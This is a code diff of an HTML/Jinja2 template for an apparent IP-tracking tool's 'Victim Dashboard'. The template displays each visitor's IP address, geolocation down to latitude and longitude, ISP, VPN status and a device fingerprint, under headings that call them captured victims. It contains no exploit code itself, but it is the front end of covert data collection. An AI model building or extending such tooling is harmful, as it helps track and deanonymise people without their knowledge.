@@ -2,43 +2,66 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>HCO-NumX Dashboard</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HCO-NumX Ultra - Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      background-color: #000;
+      background: #000;
       color: #00ff00;
       font-family: monospace;
       padding: 20px;
     }
     h1, h2 {
-      color: #0f0;
+      color: #00ff00;
+      border-bottom: 1px solid #00ff00;
     }
     .victim-box {
-      border: 1px dashed #0f0;
-      padding: 10px;
-      margin-bottom: 20px;
+      border: 1px dashed #00ff00;
+      margin-bottom: 30px;
+      padding: 15px;
     }
     ul {
       list-style-type: square;
     }
+    li {
+      margin: 4px 0;
+    }
   </style>
 </head>
 <body>
-  <h1>📊 HCO-NumX Ultra - Live Dashboard</h1>
-  <p>Total victims captured: <b>{{ data | length }}</b></p>
+  <h1>📊 HCO-NumX Ultra - Victim Dashboard</h1>
+  <p>Total victims: <b>{{ data | length }}</b></p>
 
   {% for ip, info in data.items() %}
     <div class="victim-box">
-      <h2>📍 IP: {{ ip }}</h2>
+      <h2>📍 IP Address: {{ ip }}</h2>
+
+      {% if 'country' in info %}
+      <h3>🌍 IP Details</h3>
+      <ul>
+        <li><b>Country:</b> {{ info.country }}</li>
+        <li><b>Region:</b> {{ info.regionName }}</li>
+        <li><b>City:</b> {{ info.city }}</li>
+        <li><b>ISP:</b> {{ info.isp }}</li>
+        <li><b>Org:</b> {{ info.org }}</li>
+        <li><b>ASN:</b> {{ info.as }}</li>
+        <li><b>Latitude:</b> {{ info.lat }}</li>
+        <li><b>Longitude:</b> {{ info.lon }}</li>
+        <li><b>Proxy/VPN:</b> {{ info.proxy }}</li>
+      </ul>
+      {% endif %}
+
+      <h3>🧠 Device Fingerprint</h3>
       <ul>
         {% for key, value in info.items() %}
-          <li><b>{{ key.replace('_', ' ').capitalize() }}:</b> {{ value }}</li>
+          {% if key not in ['country','regionName','city','isp','org','as','lat','lon','proxy'] %}
+            <li><b>{{ key.replace('_', ' ').capitalize() }}:</b> {{ value }}</li>
+          {% endif %}
         {% endfor %}
       </ul>
     </div>
   {% else %}
-    <p>No data captured yet.</p>
+    <p>No victims have visited yet.</p>
   {% endfor %}
 </body>
 </html>
